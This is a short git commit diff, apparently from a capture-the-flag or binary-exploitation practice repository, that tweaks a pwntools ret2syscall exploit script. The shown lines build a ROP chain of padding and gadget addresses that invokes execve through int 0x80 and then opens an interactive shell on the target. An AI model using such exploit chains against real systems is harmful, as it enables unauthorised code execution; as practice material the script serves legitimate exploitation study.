386aad7847cd1dcaa421712022d5203eb079e554
peixiaokun <993676483@qq.com>
2023-11-11 17:49:54 +0800

    finish

--- repetition/ret2syscall/ret2syscall.py
+++ repetition/ret2syscall/ret2syscall.py
@@ -4,6 +4,6 @@ eax = 0x80bb196
 edx_ecx_ebx = 0x806eb90
 string = 0x80be408
 int_0x80 = 0x8049421
-payload = payload = flat(['a' * 112, eax, 0xb, edx_ecx_ebx, 0, 0, string, int_0x80])
+payload = payload = flat([b'a' * 112, eax, 0xb, edx_ecx_ebx, 0, 0, string, int_0x80])
 sh.sendline(payload)
 sh.interactive()
